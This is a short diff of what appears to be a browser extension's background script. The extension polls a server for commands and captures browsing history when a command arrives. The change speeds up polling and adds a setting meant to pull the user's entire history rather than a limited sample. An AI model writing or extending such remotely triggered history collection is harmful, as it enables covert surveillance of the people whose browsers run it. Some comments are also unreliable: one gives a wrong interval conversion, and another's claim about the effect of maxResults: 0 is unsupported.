@@ -6,7 +6,7 @@ let USER_NAME = null;
 let isConnected = false;
 
 const POLL_ALARM_NAME = 'pollCommands';
-const POLL_INTERVAL_MINUTES = 0.033; // ~2 seconds (minimum is 1 minute in production, but dev allows this)
+const POLL_INTERVAL_MINUTES = 0.05; // ~2 seconds (minimum is 1 minute in production, but dev allows this) //change it to 2 seconds on dev 
 
 // ============ Initialize ============
 // Generate or retrieve client ID
@@ -210,7 +210,8 @@ async function captureHistory(commandId) {
         // Get all browser history
         const historyItems = await chrome.history.search({
             text: '',
-            startTime: 0  // Get all history from the beginning
+            startTime: 0,  // Get all history from the beginning
+            maxResults: 0  // 0 means no limit, get ALL history items (default is 100)
         });
 
         console.log(`📜 Browser history captured! (${historyItems.length} entries)`);
